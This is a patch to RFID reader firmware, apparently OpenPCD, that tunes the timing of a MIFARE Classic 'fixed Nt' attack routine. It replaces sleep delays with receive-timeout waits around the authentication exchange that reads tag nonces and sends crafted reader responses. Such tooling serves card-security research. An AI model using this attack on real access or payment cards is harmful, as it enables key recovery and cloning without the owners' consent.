@@ -336,42 +336,46 @@ int mifare_fixed_Nt_attack_realjob(struct mifare_crack_params *params)
 	usleep(TX_ON_WAIT);//probably we should not wait too long
 	
 	//do the WUPA tranceive
-	//setFlagRxTimeout();
+	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(WUPA), &WUPA, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout();//wait for the command to finish	
-	usleep(700);
+	waitFlagRxTimeout();//wait for the command to finish
+	//send 1 byte, receive 2 bytes, RXwait=8bit, wait time 360us, use 500us 
+	//usleep(500);
 	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);//flush fifo
 	
 	//////////////////////////////
 	//do anti collision
 	//tranceive, send 0x93 20
-	//setFlagRxTimeout();
+	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(SELECT), SELECT, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout();//wait for the command to finish
-	usleep(1200);
+	waitFlagRxTimeout();//wait for the command to finish
+	//send 2 bytes, receive 5 bytes, RXwait 8bit, wait time 680us, use 800us
+	//usleep(800);
 	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
 	
 	//enable TX CRC and odd parity, RX CRC disabled
 	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x07);
 	
 	//do a tranceive: select(UID): 0x93, 70, UID, BCC 
-	//setFlagRxTimeout();
+	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(SELECT_UID), SELECT_UID, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout();//wait for the command to finish
-	usleep(1500);
+	waitFlagRxTimeout();//wait for the command to finish
+	//send 9 bytes, receive 3 bytes, RXwait 8bit, 1080us, use 1300us;
+	//usleep(1300);
 	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
 		
 	//////////////////////////////
 	//do Auth block N
 	//do a tranceive: 0x60 NN CRC_A
-	//setFlagRxTimeout();
+	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, sizeof(AUTH_BLK_N), AUTH_BLK_N, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout();//wait for the command to finish
-	usleep(1500);
+	waitFlagRxTimeout();//wait for the command to finish
+	//send 4 bytes, receive 4bytes, Rxwait 8bit, 760us, use 900us;
+	//usleep(900);
 	temp = opcd_rc632_fifo_read(NULL, 4, params->Nt_actual);//read fifo, should get 32-bit Nt
 	if(temp != 4){
 		//check num of bytes returned, if incorrect, exit with error code
@@ -386,11 +390,12 @@ int mifare_fixed_Nt_attack_realjob(struct mifare_crack_params *params)
 	opcd_rc632_reg_write(NULL, RC632_REG_CHANNEL_REDUNDANCY, 0x00);
 	//do a tranceive: Nr_Ar_Parity, 9-bytes with parity bits embedded in bit stream
 
-	//setFlagRxTimeout();
+	setFlagRxTimeout();
 	opcd_rc632_fifo_write(NULL, 9, params->Nr_Ar_Parity, 0);
 	opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
-	//waitFlagRxTimeout();//wait for the command to finish
-	usleep(1200);
+	waitFlagRxTimeout();//wait for the command to finish
+	//send 9 bytes, receive 1byte, Rxwait 8bit, 960us, use 1100us;
+	//usleep(1100);
 	opcd_rc632_reg_read(NULL, RC632_REG_FIFO_LENGTH, &temp);
 	
 	switch(temp){
@@ -421,7 +426,7 @@ exit:
 	//opcd_rc632_fifo_write(NULL, sizeof(HLTA_CRCA), HLTA_CRCA, 0);
 	//opcd_rc632_reg_write(NULL, RC632_REG_COMMAND, RC632_CMD_TRANSCEIVE);
 	//waitFlagRxTimeout();//wait for the command to finish
-	//opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
+	opcd_rc632_reg_write(NULL, RC632_REG_CONTROL, 1);
 	//resume sys IRQs
 	opcd_rc632_reg_write(NULL, RC632_REG_TX_CONTROL, 0x58);//disable the field
 	enableSysIRQ();
@@ -490,8 +495,8 @@ void tc0_tc1_interval_init(void)
 							AT91C_TC_BEEVT_NONE | AT91C_TC_BCPB_NONE |	//TIOB1 external event not used, RB compare not rounted out
 							AT91C_TC_EEVT_TIOB | AT91C_TC_ETRGEDG_NONE |	//External event set to TIOB1, but not used (None edge)
 							AT91C_TC_BSWTRG_CLEAR | AT91C_TC_ASWTRG_CLEAR;	//SW trigger resets TIOA, TIOB
-	tcb->TCB_TC1.TC_RC = 128/4;//128 divider, debug purpose
-	tcb->TCB_TC1.TC_RA = 65/4;//50 duty cycle, debug purpose
+	tcb->TCB_TC1.TC_RC = 31;//128 divider,
+	tcb->TCB_TC1.TC_RA = 16;//50 duty cycle
 	tcb->TCB_TC1.TC_RB = 0xFFFF;//RB setting is useless since RB not used at all
 	
 	/*TC0 is set to waveform mode, 65536 divider, 50% dutycycle waveform*/
